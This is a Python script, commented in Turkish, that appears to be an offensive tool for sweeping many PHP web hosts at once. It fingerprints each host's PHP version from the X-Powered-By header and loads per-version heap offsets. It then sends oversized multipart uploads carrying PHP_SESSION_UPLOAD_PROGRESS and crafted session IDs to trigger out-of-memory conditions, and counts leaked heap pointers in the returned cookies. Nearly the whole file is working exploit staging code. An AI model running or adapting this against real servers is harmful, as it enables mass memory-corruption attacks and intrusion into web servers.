#!/usr/bin/env python3
"""Multi-host brute-force sweep — tam URL + X-Powered-By → versiyon → otomatik offset.

20-30 host'u tek komutla sweep eder. Her host için:
  1. GET <path> → X-Powered-By: PHP/X.Y.Z oku
  2. labs/versions/X.Y.Z/offsets.env'den ZIF_OFFSET + DTOR_OFFSET doldur
  3. Basit bf: OOM (size vary) → simple session-init → Set-Cookie sinyali
  4. Rapor: URL, version, offsets, OOM status, leak status

Usage:
  # Tam URL listesi (virgülle):
  python3 bf_multihost.py --hosts https://xxx.com/index.php,http://192.168.8.123:18113/index.php

  # host listesi dosyasından (satır başına tam URL):
  python3 bf_multihost.py --hosts-file hosts.txt

  # OOM field size sweep:
  python3 bf_multihost.py --hosts https://xxx.com/index.php --sizes 4,8,16,32,64

  # Sadece probe (X-Powered-By + offset, bf YOK):
  python3 bf_multihost.py --hosts-file hosts.txt --probe-only
"""
from __future__ import annotations
import argparse
import time

from common import (Target, build_multipart, parse_cookie,
                    count_heap_pointers, read_xpoweredby,
                    php_version_from_xpb, load_offsets, parse_url)


def probe_host(host: str, port: int, path: str, use_tls: bool) -> dict:
    """GET <path> → X-Powered-By → version → offsets."""
    try:
        st, xpb = read_xpoweredby(host, port, path=path, use_tls=use_tls)
    except OSError as e:
        return {"host": host, "port": port, "error": str(e)}
    ver = php_version_from_xpb(xpb)
    offs = load_offsets(ver) if ver else {}
    scheme = "https" if use_tls else "http"
    return {
        "host": host, "port": port, "path": path, "use_tls": use_tls,
        "status": st,
        "xpb": xpb, "version": ver,
        "known": bool(offs),          # versiyon labs/versions/ listesinde var mı?
        "zif": offs.get("ZIF_OFFSET", "?"),
        "dtor": offs.get("DTOR_OFFSET", "?"),
        "delta": offs.get("DELTA", ""),
    }


def bf_one(t: Target, size_mb: int) -> tuple[int, int, int, int]:
    """Tek bf iterasyonu: OOM (size) → simple session-init → cookie sinyali.
    Returns (st_oom, st_probe, cookie_len, heap_ptr_count)."""
    bnd = b"S" * 17
    # OOM
    parts1 = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "big", "data": b"B" * (size_mb * 1024 * 1024)},
    ]
    body1 = build_multipart(parts1, bnd)
    st1, _ = t.post_chunked(body1, bnd, read_cap=1 << 20)
    time.sleep(0.15)
    # simple session-init probe
    parts2 = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    body2 = build_multipart(parts2, b"BNDRY12345")
    st2, raw2 = t.post_chunked(body2, b"BNDRY12345", read_cap=1 << 20)
    cookie = parse_cookie(raw2)
    base, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
    return st1, st2, len(cookie), cnt


def parse_hosts(args) -> list[dict]:
    """Parse --hosts / --hosts-file into list of {host, port, path, use_tls}."""
    urls = []
    if args.hosts:
        for h in args.hosts.split(","):
            urls.append(h.strip())
    if args.hosts_file:
        for line in open(args.hosts_file):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            urls.append(line)
    # Parse each URL
    seen = set()
    out = []
    for u in urls:
        p = parse_url(u)
        key = (p["host"], p["port"], p["path"], p["use_tls"])
        if key not in seen:
            seen.add(key)
            out.append(p)
    return out


def url_str(p: dict) -> str:
    """Pretty-print a parsed URL."""
    scheme = "https" if p.get("use_tls") else "http"
    return f"{scheme}://{p['host']}:{p['port']}{p.get('path', '/')}"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", default="",
                    help="comma-separated URLs (http://host:port/path or https://host/path)")
    ap.add_argument("--hosts-file", default="",
                    help="file with one URL per line")
    ap.add_argument("--sizes", default="4,8,16,32,64",
                    help="OOM field sizes (MB), comma-separated")
    ap.add_argument("--probe-only", action="store_true",
                    help="only probe X-Powered-By + offsets, no bf")
    args = ap.parse_args()

    hosts = parse_hosts(args)
    if not hosts:
        ap.error("no hosts given (use --hosts or --hosts-file)")
    sizes = [int(s) for s in args.sizes.split(",")]

    # Phase 1: probe all hosts
    print(f"{'URL':<45} {'ver':<8} {'ZIF':<12} {'DTOR':<12} {'DELTA':<10}",
          flush=True)
    print("-" * 90, flush=True)
    probes = {}
    for p in hosts:
        key = (p["host"], p["port"], p["path"])
        probe = probe_host(p["host"], p["port"], p["path"], p["use_tls"])
        probes[key] = probe
        u = url_str(p)
        if "error" in probe:
            print(f"{u:<45} ERR: {probe['error']}", flush=True)
        elif not probe.get("known", False):
            print(f"{u:<45} ⚠ YOK  X-Powered-By: {probe['xpb'] or '(yok)'}",
                  flush=True)
            print(f"{'':<45} → labs/versions/{probe['version'] or '<ver>'}/offsets.env "
                  f"eksik — offset'leri ekleyin", flush=True)
        else:
            print(f"{u:<45} {probe['version']:<8} {probe['zif']:<12} "
                  f"{probe['dtor']:<12} {probe['delta']:<10}", flush=True)
    print("-" * 90, flush=True)

    if args.probe_only:
        return 0

    # Phase 2: bf sweep each host
    print(flush=True)
    for p in hosts:
        key = (p["host"], p["port"], p["path"])
        probe = probes[key]
        if "error" in probe:
            continue
        u = url_str(p)
        t = Target(p["host"], p["port"], path=p["path"],
                   verbose=False, use_tls=p["use_tls"])
        print(f"\n=== {u}  PHP {probe['version']}  "
              f"ZIF={probe['zif']} DTOR={probe['dtor']} ===", flush=True)
        print(f"  {'MB':>4} | {'stOOM':>6} | {'stPrb':>6} | {'cookie':>8} | "
              f"{'cnt':>4} | signal", flush=True)
        print("  " + "-" * 55, flush=True)
        for size in sizes:
            st1, st2, clen, cnt = bf_one(t, size)
            signal = "LEAK!" if (clen > 100 and cnt >= 8) else (
                "big" if clen > 100 else "clean")
            print(f"  {size:>4} | {st1:>6} | {st2:>6} | {clen:>7}B | "
                  f"{cnt:>4} | {signal}", flush=True)
            time.sleep(0.1)

    print(flush=True)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
